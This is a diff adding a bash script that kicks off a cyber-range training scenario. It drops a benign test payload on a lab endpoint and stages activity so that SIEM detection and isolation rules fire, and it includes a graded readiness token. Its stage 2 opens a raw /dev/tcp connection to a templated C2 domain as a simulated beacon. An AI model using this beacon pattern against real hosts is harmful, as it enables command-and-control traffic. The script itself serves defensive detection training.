@@ -1,0 +1,144 @@
+#!/usr/bin/env bash
+# =============================================================================
+# Scenario kickoff — UML steps 1 -> 2.
+#
+# "Cyber Range -> Lab Hosts/Endpoints: inject simulated malware activity
+# (phishing email + payload delivery)". This runs ON the endpoint, because the
+# UML has no attacker host: the injection originates at the Cyber Range and
+# lands here. Nothing is fetched over the network and no service is contacted —
+# the staged payload is simply moved into the monitored paths, which is exactly
+# the observable behaviour a real delivery would produce.
+#
+# Benign by design: the payload is an EICAR-equivalent test artefact, generated
+# at provision time and never stored in the repository.
+#
+# MODES
+#   --arm     verify the range is ready and print the confirmation token.
+#             Graded by training level L4 — the token must be exactly
+#             "{{ puc2_arm_token }}". Read-only: arming fires nothing.
+#   (none)    perform the injection (UML step 2).
+#
+# DELIVERY IS MULTI-STAGE ON PURPOSE. Rule 100103 ("targeted attack confirmed",
+# UML step 6) correlates repeated IOC hits inside a 600 s window, and it is the
+# rule wired to the containment active response. A single payload drop fires
+# 100101 exactly once, which would leave step 6 with no live trigger and the
+# response path dead. Each stage below is a distinct event, and the whole
+# sequence completes BEFORE containment runs — which is why 100101 must not be
+# in the trigger set: it would isolate the host mid-delivery and stage 2's
+# beacon would never reach the egress filter that feeds rule 100102.
+#
+#   stage 1  payload -> ~{{ puc2_victim_user }}/Downloads      -> 100100 -> 100101
+#   stage 2  C2 beacon to {{ puc2_c2_domain }}:{{ puc2_c2_port }}, blocked+logged
+#            by the baseline egress filter                     -> 100102
+#   stage 3  payload copied to /tmp (staging behaviour)        -> 100100 -> 100101
+#   stage 4  second payload name dropped in Downloads          -> 100100 -> 100101
+#                                                              => 100103 fires
+# =============================================================================
+set -uo pipefail
+
+STAGED="{{ puc2_injection_root }}/{{ puc2_payload_name }}"
+VICTIM="{{ puc2_victim_user }}"
+VICTIM_HOME="/home/{{ puc2_victim_user }}"
+MAIL_SPOOL="{{ puc2_victim_mail_spool }}"
+C2_DOMAIN="{{ puc2_c2_domain }}"
+C2_IP="{{ puc2_c2_ip }}"
+C2_PORT="{{ puc2_c2_port }}"
+EXPECTED_MD5="{{ puc2_payload_md5 }}"
+ARM_TOKEN="{{ puc2_arm_token }}"
+FW_PREFIX="{{ puc2_fw_log_prefix }}"
+QUARANTINE_DIR="{{ puc2_quarantine_dir }}"
+ISOLATION_MARKER="{{ puc2_isolation_marker }}"
+ERADICATION_MARKER="{{ puc2_eradication_marker }}"
+STAGE_PAUSE="${STAGE_PAUSE:-20}"   # seconds between stages; all well inside 600
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "Must run as root (the payload is dropped as ${VICTIM})." >&2
+    exit 1
+fi
+
+# =============================================================================
+# --arm : verify readiness, fire nothing, print the token (training L4)
+# =============================================================================
+if [ "${1:-}" = "--arm" ]; then
+    fail=0
+    check() {
+        if eval "$2" >/dev/null 2>&1; then
+            printf '  [ OK ] %s\n' "$1"
+        else
+            printf '  [FAIL] %s\n' "$1"; fail=1
+        fi
+    }
+    echo "Arming PUC2 Sub Case 2c scenario..."
+    check "payload staged at ${STAGED}"                 "[ -f '${STAGED}' ]"
+    check "payload MD5 matches the CTI-SS IOC"          "[ \"\$(md5sum '${STAGED}' | cut -d' ' -f1)\" = '${EXPECTED_MD5}' ]"
+    check "phishing email delivered to ${MAIL_SPOOL}"   "[ -s '${MAIL_SPOOL}' ]"
+    check "victim account exists"                       "id '${VICTIM}'"
+    check "Wazuh agent running (telemetry to NG-SIEM)"  "systemctl is-active --quiet wazuh-agent"
+    check "active response puc2-isolate deployed"       "[ -x /var/ossec/active-response/bin/puc2-isolate ]"
+    # The next three checks read the state the scenario depends on, not a proxy
+    # for it. On 2026-10-11 all three proxies said OK on a range still contained
+    # from an earlier run: "systemctl is-active" holds for a oneshot unit whatever
+    # happened to its rules, and "getent hosts" succeeded with the C2 name
+    # sinkholed to 0.0.0.0. The beacon never reached the LOG rule, and rule
+    # 100102 had nothing to decode.
+    check "baseline egress filter armed (rule 100102)"  "iptables -C OUTPUT -p tcp --dport '${C2_PORT}' -j LOG --log-prefix '${FW_PREFIX}: ' --log-level 4"
+    check "C2 domain resolves to ${C2_IP} (${C2_DOMAIN})" "[ \"\$(getent hosts '${C2_DOMAIN}' | awk '{print \$1}')\" = '${C2_IP}' ]"
+    # A range handed over after an earlier run still holds that run's containment
+    # and evidence: the beacon is dropped before it is logged, the markers L19 and
+    # L21 grade already exist, the quarantine is full. Reset it first (see the
+    # runbook, "Resetting between runs": puc2-isolate --lift does the firewall).
+    check "no containment left from an earlier run"     "! iptables -C OUTPUT -d '${C2_IP}' -j DROP && [ ! -e '${ISOLATION_MARKER}' ] && [ ! -e '${ERADICATION_MARKER}' ] && [ -z \"\$(ls -A '${QUARANTINE_DIR}' 2>/dev/null)\" ]"
+
+    if [ "${fail}" -ne 0 ]; then
+        echo "SCENARIO NOT ARMED: fix the failures above and re-run." >&2
+        echo "Trainees: tell your instructor. The range is not ready for this run." >&2
+        exit 1
+    fi
+    echo "SCENARIO ARMED: token=${ARM_TOKEN}"
+    exit 0
+fi
+
+# =============================================================================
+# Injection (UML step 2)
+# =============================================================================
+if [ ! -f "${STAGED}" ]; then
+    echo "Staged payload missing: ${STAGED}. Re-run provisioning." >&2
+    exit 1
+fi
+
+drop_as_victim() {
+    install -o "${VICTIM}" -g "${VICTIM}" -m 0755 "${STAGED}" "$1"
+    echo "        dropped $1"
+}
+
+echo "[CYBER RANGE] Initiating malware scenario (UML step 1)"
+echo "[CYBER RANGE] Phishing email waiting in ${MAIL_SPOOL}"
+echo "[CYBER RANGE] Injecting simulated malware activity (UML step 2)"
+
+echo "[INJECT] stage 1/4 — phishing link 'clicked', payload lands in Downloads"
+install -d -o "${VICTIM}" -g "${VICTIM}" -m 0755 "${VICTIM_HOME}/Downloads"
+drop_as_victim "${VICTIM_HOME}/Downloads/{{ puc2_payload_name }}"
+sudo -u "${VICTIM}" "${VICTIM_HOME}/Downloads/{{ puc2_payload_name }}" >/dev/null 2>&1 || true
+sleep "${STAGE_PAUSE}"
+
+echo "[INJECT] stage 2/4 — payload beacons to C2 ${C2_DOMAIN}:${C2_PORT}"
+# Beaconing BY NAME, not by IP: training level L11 has the analyst correlate an
+# outbound attempt to the C2 *domain*. The sinkhole entry resolves the name to
+# ${C2_IP}; the baseline egress filter then DROPs and LOGs the connection, and
+# that log line is the firewall telemetry rule 100102 decodes. A timeout is the
+# expected outcome.
+timeout 5 bash -c "echo beacon > /dev/tcp/${C2_DOMAIN}/${C2_PORT}" 2>/dev/null || true
+echo "        beacon to ${C2_DOMAIN} attempted (expected: blocked and logged)"
+sleep "${STAGE_PAUSE}"
+
+echo "[INJECT] stage 3/4 — payload stages a copy in /tmp"
+drop_as_victim "/tmp/{{ puc2_payload_name }}"
+sleep "${STAGE_PAUSE}"
+
+echo "[INJECT] stage 4/4 — second lure dropped in Downloads"
+drop_as_victim "${VICTIM_HOME}/Downloads/statement.exe"
+
+echo
+echo "[INJECT] Delivery complete. Telemetry inbound to NG-SIEM."
+echo "[INJECT] Expected chain: 100100 -> 100101 (x3) + 100102 -> 100103"
+echo "[INJECT] Rule 100103 (correlated confirmation) fires puc2-isolate."
